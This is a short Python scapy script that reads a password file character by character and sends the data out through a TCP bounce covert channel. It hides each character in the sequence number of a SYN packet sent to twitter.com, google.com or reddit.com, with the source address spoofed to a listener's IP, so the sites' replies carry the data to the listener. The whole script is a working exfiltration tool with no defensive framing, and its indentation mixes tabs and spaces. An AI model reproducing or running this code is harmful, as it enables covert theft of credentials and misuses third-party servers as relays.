#! /usr/bin/env python

from scapy.all import TCP,IP,send
import time


src_naame = '10.0.2.15'  # Enter ip of listener
src_port = 666		 # Enter port on which listener iss listening


i = 0
sn = 70

f = open("/home/MadMaxx/Desktop/psswd.txt",'r')
webs = ['twitter.com', 'google.com', 'reddit.com']

for line in f.readlines():
    for c in line:
	serv = webs[i]
        ip = IP(dst=serv,src=src_naame)
        p = sn*1000 + ord(c)
        tcp = TCP(sport=src_port,dport=443,flags='S',seq=p)
        send(ip/tcp)
	ip.show()
	tcp.show()
	time.sleep(0.5)
	send(ip/TCP(dport=443,flags='F'))
        sn+=1
	if i+1 == len(webs):
		i = 0
	else:
		i+=1